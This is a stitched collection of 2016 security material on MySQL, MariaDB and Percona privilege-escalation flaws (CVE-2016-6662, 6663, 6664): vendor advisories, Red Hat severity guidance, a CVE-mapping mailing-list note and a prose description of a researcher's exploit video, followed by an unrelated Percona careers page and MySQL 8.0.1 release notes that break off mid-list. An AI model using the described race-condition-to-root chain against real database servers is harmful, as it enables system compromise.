Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update October 2016 Availability Document, [My Oracle Support Note 2171485.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2171485.1).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy](/support/lifetime-support/). We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have Extended Support under the [Lifetime Support Policy](/support/lifetime-support/). Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 7 new security fixes for Oracle Java SE. All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpuoct2016verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 8 releases.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

## Topic

An update for rh-mysql56-mysql is now available for Red Hat Software Collections.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MySQL is a multi-user, multi-threaded SQL database server. It consists of the MySQL server daemon, mysqld, and many client programs.

The following packages have been upgraded to a newer upstream version: rh-mysql56-mysql (5.6.34).

Security Fix(es):

* It was discovered that the MySQL logging functionality allowed writing to MySQL configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MySQL performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663, CVE-2016-5616)
* A flaw was found in the way the mysqld\_safe script handled creation of error log file. The mysql operating system user could use this flaw to escalate their privileges to root. (CVE-2016-6664, CVE-2016-5617)
* This update fixes several vulnerabilities in the MySQL database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory pages, listed in the References section. (CVE-2016-3492, CVE-2016-5507, CVE-2016-5626, CVE-2016-5629, CVE-2016-8283)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MySQL server daemon (mysqld) will be restarted automatically.

5.5.53/5.6.34/5.7.16 change the defaults for secure_file_priv - the
change that should break privilege escalation from FILE privilege to
database administrator. See upstream release notes for details.

The advisory is not very explicit regarding which issue the CVE is for,
which leaves space for using it to refer to any related change.  Mitre
CVE description is more specific and says the id is for "general log
can write to my.cnf".  That description is consistent with how the id
was used by MariaDB upstream, or where Dawid's advisory says it was
fixed.

> And btw, Dawid: what happened with CVE-2016-6663? Still not public
> yet?

That CVE is now listed as fixed in MariaDB 5.5.52 and 10.1.18.  Based
on information from MariaDB upstream, the CVE is used for the race
condition issue fixed in this commit:

<https://github.com/MariaDB/server/commit/347eeefbfc658c8531878218487d729f4e020805>

MySQL fixed the issue in:

<https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291>

Looking at the Oracle CPU, it seems CVE-2016-5616 is Oracle's dupe of
CVE-2016-6663.

It would be nice to have this conclusion confirmed by Oracle, but
frankly, we're unlikely to see that.  However, Dawid, as the original
reporter, can ask Oracle what CVEs they assigned to issues he reported,
and share the response.

## [Video PoC Exploit for the MySQL / MariaDB / Percona vulnerabilities:](https://legalhackers.com)[\* **CVE-2016-6663 / CVE-2016-5616** - Privilege Escalation via Race Condition](http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)[\* **CVE-2016-6664 / CVE-2016-5617** - Root Privilege Escalation](http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html)Discovered by **Dawid Golunski** [Follow @dawid\_golunski](https://twitter.com/dawid_golunski) The video shows the ease of exploitation of the race condition **CVE-2016-6663** vulnerability on MySQL / MariaDB / Percona databases despite a seemingly short time window to take advantage of the unsafe file operations performed by the affected databases. In the video, the race gets exploited on each of the target databases (MySQL/MariaDB/Percona) in turn (i.e. the **CVE-2016-6663** exploit is run 3 times on 3 different deployments). It shows that it typically does not take more than a few seconds to exploit the vulnerability and gain 'mysql' system shell. From there an attacker could escalate to root system account due to **CVE-2016-6664** vulnerability as presented on the example of the last target in the video (Percona). Alternatively they could use the previously published root exploit for CVE-2016-6662 vuln (not shown/used in the video). In the presented scenario, an attacker gains access to the target systems via a vulnerable web application (vulnerable File Upload feature). The vulnerability could be exploited even more easily in a shared hosting environment (multiple databases hosted on the same server) in which they would already have access to the system. More information on all of these issues can be found in the respective advisories published on <https://legalhackers.com> Thanks for watching To receive updates on these as well as new vulnerabilities [Follow @dawid\_golunski](https://twitter.com/dawid_golunski) ~~~~~~~~~~~ **ExploitBox.io** ~~~~~~~~~~~~~~~~ **Interested in security / vulns / exploits ?** Check out the new project of the author of this advisory: [**ExploitBox.io**A Playground & Labs for security folks into HACKING &AMp the art of exploitation](https://ExploitBox.io) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# MySQL / MariaDB / PerconaDB - Privilege Escalation / Race Condition Exploit [CVE-2016-6663 / OCVE-2016-5616]

CVE-2016-6663 / OCVE-2016-5616
Vulnerability: MySQL / MariaDB / PerconaDB - Privilege Escalation /
Race Condition

Discovered by:
Dawid Golunski
@dawid_golunski

<http://legalhackers.com>

Affected versions:

MariaDB
< 5.5.52
< 10.1.18
< 10.0.28

MySQL
<= 5.5.51
<= 5.6.32
<= 5.7.14

Percona Server
< 5.5.51-38.2
< 5.6.32-78-1
< 5.7.14-8

Percona XtraDB Cluster
< 5.6.32-25.17
< 5.7.14-26.17
< 5.5.41-37.0

An independent research has revealed a race condition vulnerability which
affects MySQl, MariaDB and PerconaDB databases.
The vulnerability can allow a local system user with access to the affected
database in the context of a low-privileged account
(CREATE/INSERT/SELECT grants)
to escalate their privileges and execute arbitrary code as the database system
user (typically 'mysql').
Successful exploitation would allow an attacker to gain full read/write access
to all of the files (including configuration files) and databases belonging
to the affected database server.
The obtained level of access upon the exploitation, could be chained with
the other privilege escalation vulnerabilities discovered by the author of
this advisory (CVE-2016-6662 and CVE-2016-6664) to further escalate privileges
from mysql user to root user and thus allow attackers to fully compromise the
target server.

| [Description](show_bug.cgi?id=1386554#c0)  Adam Mariš    2016-10-19 08:57:34 UTC  ``` Vulnerability in the MySQL Server component of Oracle MySQL (subcomponent: Server: Optimizer). Supported versions that are affected are 5.5.51 and earlier, 5.6.32 and earlier and 5.7.14 and earlier. Easily exploitable vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2016%3A2131)

## Topic

An update for mariadb55-mariadb is now available for Red Hat Software Collections.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server. For all practical purposes, MariaDB is binary-compatible with MySQL.

The following packages have been upgraded to a newer upstream version: mariadb55-mariadb (5.5.53).

Security Fix(es):

* It was discovered that the MariaDB logging functionality allowed writing to MariaDB configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MariaDB performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663)
* This update fixes several vulnerabilities in the MariaDB database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory page, listed in the References section. (CVE-2016-3492, CVE-2016-5612, CVE-2016-5616, CVE-2016-5624, CVE-2016-5626, CVE-2016-5629, CVE-2016-8283)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

# Percona Careers

Live and work from anywhere!

[Find your next role](#get-started)

### Remote by Design

Since its founding in 2006, Percona has always been a remote company. The reason? It’s a tech company that knows how to use technology effectively and doesn’t want to have geography limit its talent pool, said CEO Ann Schlemmer.
![](data:image/svg+xml...)

We have a high degree of trust with our staff. Leaders aren’t checking to see what time workers log in each day or moni toring if their light on Slack is green. You can’t have that sort of behavior and have an effective remote company. I have pride in how we live our values. That’s one of our values: We don’t care where you’re located... If someone is a digital nomad and that’s their lifestyle and that makes them happiest, I think that brings productivity. The goal is for employees to get their work done and then just enjoy life.”
![](data:image/svg+xml...)
**Ann Schlemmer**
CEO Percona

![](data:image/svg+xml...)

Every day at Percona, I am fortunate to collaborate with exceptional colleagues across every department, creating an environment where expertise is all around us. Our collective excellence is not only a daily inspiration, but it also raises the performance bar for everyone. I am truly grateful to be a part of a culture where our commitment to core values is palpable, driving our unwavering dedication to delivering for our customers, community, and colleagues. We rarely have a boring day here at Percona!”
![](data:image/svg+xml...)
**Bennie Grant**
COO Percona

![](data:image/svg+xml...)

What keeps me excited every day is Percona's unique culture and remote-only approach. It provides me with daily opportunities to collaborate with colleagues from all over the world, which enriches my work experience. We push boundaries, offer flexibility, and create a dynamic environment that fosters innovation and finding a better way. Percona is more than just a workplace; it is a global community of passionate experts, making it a great place to work.”

**Doug Miller**
SVP People & Culture Percona

## Changes in MySQL 8.0.1 (2017-04-10, Development Milestone)

For general information about upgrades, downgrades, platform support, etc., please visit [https://dev.mysql.com/doc/relnotes/mysql/8.0/en/](/doc/relnotes/mysql/8.0/en/).

Note

This is a milestone release, for
use at your own risk. Upgrades between milestone releases (or from a milestone
release to a GA release) are not supported. Significant development changes take
place in milestone releases and you may encounter compatibility issues, such
as data format changes that require attention in addition to the usual
procedure of running **mysql\_upgrade**. For example, you
may find it necessary to dump your data with **mysqldump**
before the upgrade and reload it afterward. (Making a backup before
the upgrade is a prudent precaution in any case.)

Note

This release makes several important changes in Unicode
character set support. In particular, the default character
set has changed from `latin1` to
`utf8mb4`.

### Account Management Notes

* **Incompatible Change:**
  Components and plugins now can define privileges dynamically (at
  runtime), which enables them to create privileges specifically
  associated with the capabilities they implement.

  Implementation of dynamic privileges enables DBAs to begin
  migrating away from the [`SUPER`](/doc/refman/8.0/en/privileges-provided.html#priv_super)
  privilege. In the past, [`SUPER`](/doc/refman/8.0/en/privileges-provided.html#priv_super) has
  been associated with a wide and growing variety of operations,
  not all related to each other. Many operations covered by
  [`SUPER`](/doc/refman/8.0/en/privileges-provided.html#priv_super) now are also associated
  with a dynamic privilege of more limited scope, and that
  privilege is registered by the component or plugin that
  implements the operation. Each such operation that previously
  required the [`SUPER`](/doc/refman/8.0/en/privileges-provided.html#priv_super) privilege can
  be permitted to an account by granting the associated dynamic
  privilege rather than [`SUPER`](/doc/refman/8.0/en/privileges-provided.html#priv_super). For
  example, a user who must be able to modify global system
  variables can be granted
  [`SYSTEM_VARIABLES_ADMIN`](/doc/refman/8.0/en/privileges-provided.html#priv_system-variables-admin) rather
  than [`SUPER`](/doc/refman/8.0/en/privileges-provided.html#priv_super).

  This change improves security by enabling DBAs to avoid granting
  [`SUPER`](/doc/refman/8.0/en/privileges-provided.html#priv_super) and tailor user privileges
  more closely to the operations permitted.
  [`SUPER`](/doc/refman/8.0/en/privileges-provided.html#priv_super) is now deprecated and will
  be removed in a future MySQL version.

  Dynamic privileges apply only at the global level. The server
  stores information about current assignments of dynamic
  privileges to user accounts in
  `mysql.global_grants`, a new table in the
  `mysql` system database.

  For more information, see
  [Static Versus Dynamic Privileges](/doc/refman/8.0/en/privileges-provided.html#static-dynamic-privileges). That discussion
  includes instructions for migrating accounts away from
  [`SUPER`](/doc/refman/8.0/en/privileges-provided.html#priv_super) to dynamic privileges.

  Incompatibility: [`SHOW GRANTS`](/doc/refman/8.0/en/show-grants.html) no
  longer displays [`ALL
  PRIVILEGES`](/doc/refman/8.0/en/privileges-provided.html#priv_all) in its global-privileges output because the
  meaning of [`ALL
  PRIVILEGES`](/doc/refman/8.0/en/privileges-provided.html#priv_all) at the global level varies depending on
  which dynamic privileges are defined. Instead,
  [`SHOW GRANTS`](/doc/refman/8.0/en/show-grants.html) explicitly lists each
  granted global privilege. For details, see
  [SHOW GRANTS Statement](/doc/refman/8.0/en/show-grants.html). Applications that process
  [`SHOW GRANTS`](/doc/refman/8.0/en/show-grants.html) output should be
  adjusted accordingly.

  If you upgrade to this MySQL release from an earlier version,
  you must run **mysql\_upgrade** (and restart the
  server) to incorporate these changes into the
  `mysql` system database.
  (WL #8131)

### C API Notes

* The C API implemented by `libmysqlclient` now
  includes a client interface for reading a stream of replication
  events from a MySQL server binary log. For more information, see
  [C API Binary Log Interface](/doc/c-api/8.0/en/c-api-binary-log-interface.html)
  (WL #7672)

### Character Set Support

* **Important Change:**
  The default character set has changed from
  `latin1` to `utf8mb4`. These
  system variables are affected:

  + The default value of the
    [`character_set_server`](/doc/refman/8.0/en/server-system-variables.html#sysvar_character_set_server) and
    [`character_set_database`](/doc/refman/8.0/en/server-system-variables.html#sysvar_character_set_database)
    system variables has changed from `latin1`
    to `utf8mb4`.
  + The default value of the
    [`collation_server`](/doc/refman/8.0/en/server-system-variables.html#sysvar_collation_server) and
    [`collation_database`](/doc/refman/8.0/en/server-system-variables.html#sysvar_collation_database) system
    variables has changed from
    `latin1_swedish_ci` to
    `utf8mb4_0900_ai_ci`.

  As a result, the default character set and collation for new
  objects differ from previously unless an explicit character set
  and collation are specified. This includes databases and objects
  within them, such as tables, views, and stored programs. One way
  to preserve the previous defaults is to start the server with
  these lines in the `my.cnf` file:

  ```
  [mysqld]
  character_set_server=latin1
  collation_server=latin1_swedish_ci
  ```

  (WL #7554)
* Performance of UCA 9.0.0-based collations (for example,
  `utf8mb4_0900_ai_ci`) was improved. These
  collations are now faster than any other UCA collations.

  Additionally, the
  [`max_length_for_sort_data`](/doc/refman/8.0/en/server-system-variables.html#sysvar_max_length_for_sort_data) system
  variable default value has been increased from 1024 to 4096.
  (Bug #24823885, Bug #83319)
* The default collation for the `utf8mb4`
  character set has changed from
  `utf8mb4_general_ci` to
  `utf8mb4_0900_ai_ci`;
  `utf8mb4_general_ci` does not handle characters
  outside the Basic Multilingual Plane (BMP) correctly.
  (Bug #24742157)
* The pad attribute for Unicode 9.0.0 collations was changed from
  `PAD SPACE` to `NO PAD`.
  Consequently, these collations now treat spaces at the end of
  strings as significant, like any other character. The affected
  collations have names that contain the string
  `_0900_`.

  Comparisons of nonbinary strings (`CHAR`,
  `VARCHAR`, and `TEXT` strings)
  that have a 9.0.0 (`NO PAD`) collation differ
  from `PAD SPACE` collations with respect to
  trailing spaces. For example, `'a'` and
  `'a '` compare as different strings, not
  the same string. Example:

  ```
  mysql> SET NAMES 'latin1' COLLATE 'latin1_swedish_ci';
  mysql> SELECT 'a' = 'a ';
  +------------+
  | 'a' = 'a ' |
  +------------+
  |          1 |
  +------------+
  mysql> SET NAMES 'utf8mb4' COLLATE 'utf8mb4_0900_ai_ci';
  mysql> SELECT 'a' = 'a ';
  +------------+
  | 'a' = 'a ' |
  +------------+
  |          0 |
  +------------+
  ```

  See also
  [Trailing Space Handling in Comparisons](/doc/refman/8.0/en/charset-binary-collations.html#charset-binary-collations-trailing-space-comparisons).

  The `INFORMATION_SCHEMA`
  [`COLLATIONS`](/doc/refman/8.0/en/information-schema-collations-table.html) table now has a
  `PAD_ATTRIBUTE` column that indicates the pad
  attribute for each collation.

  A problem with the `latin1_de` collation
  involving early weight string truncation has been corrected. The
  only likely effect is for
  [`WEIGHT_STRING()`](/doc/refman/8.0/en/string-functions.html#function_weight-string) function results.
  (WL #10354)
* Complementing earlier work in MySQL 8.0.0 to add
  case-insensitive and accent-insensitive collations for the
  `utf8mb4` Unicode character set, new
  case-sensitive and accent-sensitive collations have been added.
  The general collation is named
  `utf8mb4_0900_as_cs`, and there are
  language-specific collations with characteristics similar to
  `utf8mb4_0900_as_cs` except that
  language-specific rules take precedence where applicable. The
  language-specific collations are indicated by ISO 639-1 language
  codes in the collation name, as shown in the following table. In
  two cases the language code has an additional item that denotes
  a variant (German phone book order, Traditional Spanish).

  Note

  `utf8mb4_ja_0900_as_cs` is the first Japanese
  language-specific collation available for Unicode in MySQL.

  **Table 2 utf8mb4 UCA 9.0.0 Language-Specific Collations**

  | Language | Collation |
  | --- | --- |
  | Croatian | `utf8mb4_hr_0900_as_cs` |
  | Czech | `utf8mb4_cs_0900_as_cs` |
  | Danish | `utf8mb4_da_0900_as_cs` |
  | Esperanto | `utf8mb4_eo_0900_as_cs` |
  | Estonian | `utf8mb4_et_0900_as_cs` |
  | German phone book order | `utf8mb4_de_pb_0900_as_cs` |
  | Hungarian | `utf8mb4_hu_0900_as_cs` |
  | Icelandic | `utf8mb4_is_0900_as_cs` |
  | Japanese | `utf8mb4_ja_0900_as_cs` |
  | Latvian | `utf8mb4_lv_0900_as_cs` |
  | Lithuanian | `utf8mb4_lt_0900_as_cs` |
  | Polish | `utf8mb4_pl_0900_as_cs` |
  | Classical Latin | `utf8mb4_la_0900_as_cs` |
  | Romanian | `utf8mb4_ro_0900_as_cs` |
  | Slovak | `utf8mb4_sk_0900_as_cs` |
  | Slovenian | `utf8mb4_sl_0900_as_cs` |
  | Modern Spanish | `utf8mb4_es_0900_as_cs` |
  | Traditional Spanish | `utf8mb4_es_trad_0900_as_cs` |
  | Swedish | `utf8mb4_sv_0900_as_cs` |
  | Turkish | `utf8mb4_tr_0900_as_cs` |
  | Vietnamese | `utf8mb4_vi_0900_as_cs` |

  `utf8mb4_0900_as_cs` also works as an
  accent-sensitive, case-sensitive collation for the languages in
  the following table.

  **Table 3 Languages for Which utf8mb4\_0900\_as\_cs is Suitable**

  | Language Name | Language Code |
  | --- | --- |
  | German (dictionary order) | de |
  | English | en |
  | French (locale fr\_FR) | fr |
  | Irish Gaelic | ga |
  | Indonesian | id |
  | Italian | it |
  | Luxembourgian | lb |
  | Malay | ms |
  | Dutch | nl |
  | Portuguese | pt |
  | Swahili | sw |
  | Zulu | zu |

  `utf8mb4_0900_as_cs` is suitable for French
  French (locale `fr_FR`) but not for Canadian
  French (locale `fr_CA`). For Canadian French,
  `utf8mb4_0900_ai_ci` is suitable. The reason
  for the difference between `ai_ci` and
  `as_cs` collations is that Canadian French has
  a different order of accented characters than French French.

  `utf8mb4_da_0900_as_cs` also works as an
  accent-sensitive, case-sensitive collation for the languages in
  the following table.

  **Table 4 Languages for Which utf8mb4\_da\_0900\_as\_cs is Suitable**

  | Language Name | Language Code |
  | --- | --- |
  | Norwegian | no |
  | Norwegian Bokmål | nb |
  | Norwegian Nynorsk | nn |

  The nonlanguage-specific `utf8mb4_0900_as_cs`
  and language-specific
  `utf8mb4_LANG_0900_as_cs`
  Unicode collations each have these characteristics:

  + The collation is based on Unicode Collation Algorithm (UCA)
    9.0.0 and Common Locale Data Repository (CLDR) v30, is
    accent sensitive, and case sensitive. These characteristics
    are indicated by `_0900`,
    `_as`, and `_cs` in the
    collation name. Exception:
    `utf8mb4_la_0900_as_cs` is not based on
    CLDR because Classical Latin is not defined in CLDR.
  + The collation works for all characters in the range [U+0,
    U+10FFFF].
  + If the collation is not language specific, it sorts all
    characters, including supplemental characters, in default
    order (described following). If the collation is language
    specific, it sorts characters of the language correctly
    according to language-specific rules, and characters not in
    the language in default order.
  + By default, the collation sorts characters having a code
    point listed in the DUCET table (Default Unicode Collation
    Element Table) according to the weight value assigned in the
    table. The collation sorts characters not having a code
    point listed in the DUCET table using their implicit weight
    value, which is constructed according to the UCA.

    The collation sorts on all three DUCET weight levels,
    including the tertiary level. This compares with
    accent-insensitive, case-insensitive collations, which sort
    only on the primary and secondary levels.
  + For non-language-specific collations, characters in
    contraction sequences are treated as separate characters.
    For language-specific collations, contractions might change
    character sorting order.

  For more information, see
  [Unicode Character Sets](/doc/refman/8.0/en/charset-unicode-sets.html).
  (WL #9109, WL #9751)

### Compilation Notes

* **Incompatible Change:**
  The `my_bool` type is no longer used in MySQL
  source code. Any third-party code that used this type to
  represent C boolean variables should use the
  `bool` or `int` C type
  instead.

  Note

  The change from `my_bool` to
  `bool` means that the
  `mysql.h` header file now requires a C++ or
  C99 compiler to compile.

  (Bug #25597667)
* **InnoDB:**
